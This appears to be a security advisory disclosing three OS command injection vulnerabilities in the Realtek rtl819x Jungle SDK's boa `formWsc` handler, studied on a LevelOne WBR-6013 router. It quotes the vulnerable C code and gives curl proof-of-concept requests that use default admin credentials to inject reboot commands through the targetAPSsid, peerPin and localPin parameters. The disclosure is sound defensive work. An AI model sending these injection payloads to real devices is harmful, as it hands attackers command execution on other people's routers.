##### CWE

CWE-78 - Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)

##### DETAILS

The rtl819x Jungle SDK is an SDK for routers. This SDK uses as web server boa.

These Realtek rtl819x Jungle SDK vulnerabilities were found while researching the Levelone WBR-6013 router. We are going to explain these vulnerabilities from the perspective of the WBR-6013 router.

The WBR-6013 router has a web server called `boa`. The version used in the device is that of a Realtek SDK that uses `boa`. One of the SDK’s API is `/boafrm/formWsc`. This API allows modifications of the Wi-Fi WPS settings. The function responsible for this API is `boa`’s `formWsc`:

```
void formWsc(request *wp, char *path, char *query)
{
    [...]
[1] targetAPSsid = req_get_cstream_var(wp, "targetAPSsid", (""));
    [...]
[2] strVal = req_get_cstream_var(wp, ("triggerPIN"), "");
    if (strVal[0]) {
        int local_pin_changed = 0;
[3]     strVal = req_get_cstream_var(wp, ("localPin"), "");
        if (strVal[0]) {
            apmib_get(MIB_HW_WSC_PIN, (void *)tmpbuf);
            if (strcmp(tmpbuf, strVal)) {
[4]             apmib_set(MIB_HW_WSC_PIN, (void *)strVal);
                local_pin_changed = 1;
            }
        }
        apmib_get(MIB_WLAN_WSC_DISABLE, (void *)&intVal);
        if (intVal) {
            char localpin[100];
            intVal = 0;
            apmib_set(MIB_WLAN_WSC_DISABLE, (void *)&intVal);
            updateVapWscDisable(wlan_idx, intVal);
            apmib_update_web(CURRENT_SETTING);
            system("echo 1 > /var/wps_start_pin");

            if (local_pin_changed) {
                apmib_get(MIB_HW_WSC_PIN, (void *)localpin);
                sprintf(tmpbuf, "echo %s > /var/wps_local_pin", localpin);
[5]             system(tmpbuf);
            }
            run_init_script("bridge");
        }
        else {
            if (local_pin_changed) {

                    if(strlen(targetAPSsid)<= 32){
[6]                     translate_control_code_sprintf(targetAPSsid);
                        sprintf(tmpbuf, "iwpriv wlan%d set_mib wsc_specssid=\"%s\" ",wlan_idx, targetAPSsid);
[7]                     system(tmpbuf);
                    }else{
                        printf("invaild SSID Len\n");
                    }
                }

            if (intVal) {

```

The `formWsc` API has multiple code paths that lead to OS command injection vulnerabilities through the request’s parameters. An attacker could exploit these vulnerabilities to obtain arbitrary command execution. Following the details for each set of requests’ parameters that can lead to an OS command injection.

#### CVE-2023-50381 - targetAPSsid

At `[1]` the `targetAPSsid` request’s parameter is fetched into the `targetAPSsid` variable . At `[2]` the `triggerPIN` request’s parameter is fetched before it is checked to see if it is defined. If so, the code at `[3]` is reached. At `[3]` the `localPin` request’s parameter is fetched. If either `localPin` is not defined as request’s parameter or the value is equal to the one stored in flash, the `local_pin_changed` variable is going to remain equal to `0`. If `local_pin_changed` is `0` and the flash variable `MIB_WLAN_WSC_DISABLE` is `0`, meaning that the WPS is enabled, the code at `[6]` is reached. At `[6]` the `translate_control_code_sprintf` function is called with the `targetAPSsid` variable. Following the `translate_control_code_sprintf` function:

```
void translate_control_code_sprintf(char *buffer)
{
    char tmpBuf[200], *p1 = buffer, *p2 = tmpBuf;

    while (*p1) {
        if(*p1 == '\\'){
            memcpy(p2, "\\\\", 2);
            p2 += 2;
        }
        else if (*p1 == '%') {
            memcpy(p2, "%%", 2);
            p2 += 2;
        }
        else if(*p1 =='\"'){
            memcpy(p2, "\\\"", 2);
            p2 += 2;
        }
        else if(*p1 =='\''){
            memcpy(p2, "\\\'", 2);
            p2 += 2;
        }
        else if(*p1 =='\`'){
            memcpy(p2, "\\\`", 2);
            p2 += 2;
        }
        else
            *p2++ = *p1;
        p1++;
    }
    *p2 = '\0';

    strcpy(buffer, tmpBuf);
}

```

Essentially this function will escape some special characters.

Then the `iwpriv wlan<wlan_id> set_mib wsc_specssid="<escaped targetAPSsid>"` string is composed and executed, at `[7]`, through `system`. The escape is not enough to prevent an OS command injection. Because no checks are perfomed on the `targetAPSsid` request’s parameter, and the escaping does not prohibit a strict enough list of characters, an OS command injection can occur at `[7]`. An attacker could exploit this vulnerability to obtain arbitrary command execution.

#### Exploit Proof of Concept

To use a specific API of the web server, because of a CSRF protection mechanism, it is necessary to load the HTML page that would call that API:

```
curl --user admin:admin http://<DEVICE_IP>/wlwps.htm &>/dev/null

```

After this request it is possible to use the `/boafrm/formWsc` API:

```
curl -d "submit-url=POC&triggerPIN=1&targetAPSsid=\$(reboot)" -X POST -H "Content-Type: application/x-www-form-urlencoded" --user admin:admin http://<DEVICE_IP>/boafrm/formWsc

```

Assuming the WPS functionality is enabled, after the request the router will reboot. The POC uses the default admin credentials.

#### CVE-2023-50382 - peerPin

At `[8]` the `setPIN` request’s parameter is fetched. If its value is different than the empty string, the code at `[9]` is reached. At `[9]` the `peerPin` request’s parameter is fetched in the `strVal` variable. If the flash variable `MIB_WLAN_WSC_DISABLE` is `1`, meaning that the WPS is disabled, the code at `[10]` is reached and the `echo <peerPin> > /var/wps_peer_pin` string is composed. This string is then used at `[11]` as argument for the `system` function. Because no checks are perfomed on the `peerPin` request’s parameter, an OS command injection can occur at `[11]`.

To use a specific API of the web server, because of a CSRF protection mechanism, it is necessary to load the HTML page that would call that API:

```
curl --user admin:admin http://<DEVICE_IP>/wlwps.htm &>/dev/null

```

After this request it is possible to use the `/boafrm/formWsc` API:

```
curl -d "submit-url=POC&disableWPS=ON&setPIN=1&peerPin=\$(reboot)" -X POST -H "Content-Type: application/x-www-form-urlencoded" --user admin:admin http://<DEVICE_IP>/boafrm/formWsc

```

Assuming the WPS functionality is disabled, after the request the router will reboot. The POC uses the default admin credentials.

#### CVE-2023-50383 - localPin

At `[2]` the `triggerPIN` request’s parameter is fetched. If its value is different than the empty string, the code at `[3]` is reached. At `[3]` the `localPin` request’s parameter is fetched in the `strVal` variable. If the value of `strVal` (the `localPin` request’s parameter value) is different than the `localPin` value stored in flash, then, at `[4]`, the provided value of `localPin` is stored in flash. Later, if the flash variable `MIB_WLAN_WSC_DISABLE` is `1`, meaning that the WPS is disabled, and the request’s value of `localPin` is different than the one stored in flash, the code at `[5]` is reached. At `[5]` the `echo <localpin> > /var/wps_local_pin` is used as the argument for the `system` function. Because no checks are perfomed on the `localPin` request’s parameter, an OS command injection can occur at `[5]`.

After this request it is possible to use the `/boafrm/formWsc` API:

```
curl -d "submit-url=POC&triggerPIN=1&localPin=\`reboot\`" -X POST -H "Content-Type: application/x-www-form-urlencoded" --user admin:admin http://<DEVICE_IP>/boafrm/formWsc

```

Assuming the WPS functionality is disabled, after the request the router will reboot. The POC uses the default admin credentials.
